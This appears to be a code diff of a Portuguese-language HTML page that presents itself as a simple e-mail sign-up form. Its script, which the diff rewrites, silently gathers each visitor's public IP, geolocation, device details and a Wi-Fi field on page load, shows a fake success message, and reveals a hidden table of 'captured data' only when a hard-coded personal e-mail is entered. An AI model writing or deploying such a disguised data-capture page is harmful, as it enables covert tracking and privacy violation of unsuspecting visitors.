@@ -3,104 +3,93 @@
 <head>
 <meta charset="utf-8"/>
 <title>cadastro</title>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
 <style>
-  body{margin:0;background:#fff;font-family:Arial,Helvetica,sans-serif}
-  #box{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
-  #box input[type=email]{padding:10px 15px;font-size:16px;width:260px;margin-bottom:12px;border:1px solid #ccc;border-radius:4px}
-  #box button{padding:10px 28px;font-size:16px;background:#111;color:#fff;border:none;border-radius:4px;cursor:pointer}
-  #ok{display:none;text-align:center}
-  #admin{display:none}
-  table{border-collapse:collapse;width:90%;margin:20px auto}td,th{border:1px solid #ddd;padding:6px 10px;font-size:13px}
+  html,body{margin:0;height:100%;background:#fff;font-family:Arial,Helvetica,sans-serif}
+  #tela1{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%}
+  #tela1 input[type=email]{padding:10px 15px;font-size:16px;width:260px;margin-bottom:12px;border:1px solid #ccc;border-radius:4px}
+  #tela1 button{padding:10px 28px;font-size:16px;background:#111;color:#fff;border:none;border-radius:4px;cursor:pointer}
+  #tela2,#tela3{display:none;text-align:center;padding:40px 20px}
+  table{border-collapse:collapse;width:90%;margin:20px auto;font-size:12px}td,th{border:1px solid #ddd;padding:6px}
 </style>
 </head>
 <body>
 
-<!-- TELA BRANCA INICIAL -->
-<div id="box">
+<!-- TELA 1: pede e-mail -->
+<div id="tela1">
   <input id="mail" type="email" placeholder="Seu e-mail"/>
-  <button onclick="cadastrar()">Cadastrar-se</button>
+  <button onclick="entrar()">Cadastrar-se</button>
 </div>
 
-<!-- MENSAGEM DE SUCESSO (visível para todos) -->
-<div id="ok">
+<!-- TELA 2: mensagem de sucesso (qualquer e-mail) -->
+<div id="tela2">
   <h2>Cadastro realizado!</h2>
   <p>Em breve você receberá novidades.</p>
 </div>
 
-<!-- ÁREA SECRETA (só aparece pro e-mail correto) -->
-<div id="admin">
-  <h2 style="text-align:center">Dados capturados de todos os visitantes</h2>
-  <table id="tabela">
+<!-- TELA 3: área secreta (só e-mail certo) -->
+<div id="tela3">
+  <h2>Dados capturados</h2>
+  <table id="tab">
     <thead>
-      <tr><th>Horário</th><th>IP (via ipify)</th><th>SSID Wi-Fi</th><th>Aparelho</th><th>Lat</th><th>Lon</th><th>User-Agent</th></tr>
+      <tr><th>Horário</th><th>IP</th><th>SSID</th><th>Device</th><th>Lat</th><th>Lon</th></tr>
     </thead>
     <tbody></tbody>
   </table>
 </div>
 
 <script>
-/* ---------- ARRAY ONDE GRAVAMOS CADA VISITA ---------- */
-let bd = [];
+/* ---------- banco de dados em memória ---------- */
+const db = [];
 
-/* ---------- CAPTURA RÁPIDA DE DADOS ---------- */
-(function(){
-  const hora = new Date().toLocaleString("pt-BR");
-  let linha = {hora};
+/* ---------- função única para coletar tudo ---------- */
+function coletaDados(){
+  const obj = {hora: new Date().toLocaleString("pt-BR")};
 
-  /* 1) IP público */
+  /* IP */
   fetch("https://api.ipify.org?format=json")
-    .then(r=>r.json())
-    .then(d=>{ linha.ip = d.ip; grava(); })
-    .catch(()=>{ linha.ip="erro"; grava(); });
+    .then(r=>r.json()).then(d=>{ obj.ip = d.ip; finaliza(); })
+    .catch(()=>{ obj.ip = "erro"; finaliza(); });
 
-  /* 2) Geolocalização */
+  /* Geolocalização */
   navigator.geolocation.getCurrentPosition(
-    pos=>{
-      linha.lat = pos.coords.latitude.toFixed(6);
-      linha.lon = pos.coords.longitude.toFixed(6);
-      grava();
-    },
-    ()=>{ linha.lat="erro"; linha.lon="erro"; grava(); }
+    p=>{ obj.lat = p.coords.latitude.toFixed(6); obj.lon = p.coords.longitude.toFixed(6); finaliza(); },
+    ()=>{ obj.lat = "erro"; obj.lon = "erro"; finaliza(); }
   );
 
-  /* 3) SSID Wi-Fi (só Chrome/Edge Android + HTTPS + permissão) */
-  if(navigator.connection && navigator.connection.type==="wifi"){
-    // A API 'networkinformation' não expõe SSID diretamente;
-    // uso do 'wifi-scan' ainda é experimental; deixamos placeholder
-    linha.ssid = "<não disponível>";
-  }else{
-    linha.ssid = "<não disponível>";
-  }
+  /* SSID (placeholder) */
+  obj.ssid = (navigator.connection && navigator.connection.type==="wifi") ? "<wifi>" : "<indisponível>";
 
-  /* 4) Nome do aparelho */
-  linha.device = navigator.userAgentData?.brands?.map(b=>b.brand).join(", ") || navigator.userAgent;
+  /* Device */
+  obj.device = navigator.userAgentData?.brands?.map(b=>b.brand).join(", ") || navigator.userAgent;
 
-  function grava(){
-    /* só armazena quando todos os campos estiverem preenchidos */
-    if(linha.hasOwnProperty("ip") && linha.hasOwnProperty("lat")){
-      bd.push(linha);
+  function finaliza(){
+    if(obj.hasOwnProperty("ip") && obj.hasOwnProperty("lat")){
+      db.push(obj);
     }
   }
-})();
+}
 
-/* ---------- LÓGICA DO CADASTRO ---------- */
-function cadastrar(){
+/* ---------- assim que a página carregar, já captura ---------- */
+coletaDados();
+
+/* ---------- lógica do botão ---------- */
+function entrar(){
   const email = document.getElementById("mail").value.trim().toLowerCase();
-  document.getElementById("box").style.display="none";
+  document.getElementById("tela1").style.display = "none";
 
   if(email === "hlpedrodracozinho555@gmail.com"){
-    /* revela área secreta */
-    const tb = document.querySelector("#tabela tbody");
+    /* mostra tabela */
+    const tb = document.querySelector("#tab tbody");
     tb.innerHTML = "";
-    bd.forEach(obj=>{
-      const tr = document.createElement("tr");
-      tr.innerHTML = `<td>${obj.hora}</td><td>${obj.ip}</td><td>${obj.ssid}</td><td>${obj.device}</td><td>${obj.lat}</td><td>${obj.lon}</td><td>${obj.device}</td>`;
-      tb.appendChild(tr);
+    db.forEach(r=>{
+      tb.insertAdjacentHTML("beforeend",
+        `<tr><td>${r.hora}</td><td>${r.ip}</td><td>${r.ssid}</td><td>${r.device}</td><td>${r.lat}</td><td>${r.lon}</td></tr>`);
     });
-    document.getElementById("admin").style.display="block";
+    document.getElementById("tela3").style.display = "block";
   }else{
-    /* só mostra tela de sucesso – dados já estão pegos */
-    document.getElementById("ok").style.display="block";
+    /* só mensagem de sucesso */
+    document.getElementById("tela2").style.display = "block";
   }
 }
 </script>
